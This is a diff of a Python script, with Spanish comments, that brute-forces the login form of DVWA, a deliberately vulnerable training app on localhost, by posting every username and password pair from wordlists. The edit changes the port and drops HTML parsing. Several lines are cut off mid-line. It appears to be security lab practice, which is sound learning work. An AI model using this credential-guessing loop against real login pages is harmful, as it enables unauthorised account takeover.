@@ -1,8 +1,6 @@
 mport requests
-from bs4 import BeautifulSoup
 
-# URL de la sección de vulnerabilidad de fuerza bruta de DVWA
-url = 'http://localhost:4280/vulnerabilities/brute/'
+url = 'http://localhost:8080/vulnerabilities/brute/'
 
 # Archivos de texto con usuarios y contraseñas
 users_file = 'userlist.txt'
@@ -29,7 +27,6 @@ def brute_force_attack():
 
     for username in users:
         for password in passwords:
-            # Realizar la solicitud POST con la combinación de usuario/contrase>
             data = {
                 'username': username,
                 'password': password,
@@ -37,12 +34,8 @@ def brute_force_attack():
             }
             response = requests.post(url, headers=headers, cookies=cookies, par>
 
-
-            # Analizar la respuesta para verificar si se ha iniciado sesión con>
-            soup = BeautifulSoup(response.text, 'html.parser')
-
             # Verificar el contenido de la página para encontrar el mensaje cor>
-            if 'Welcome to the password protected area' in soup.text:
+            if 'Welcome to the password protected area' in response.text:
                 print(f'[SUCCESS] Usuario: {username} Contraseña: {password}')
             else:
                 print(f'[FAILED] Usuario: {username} Contraseña: {password}')
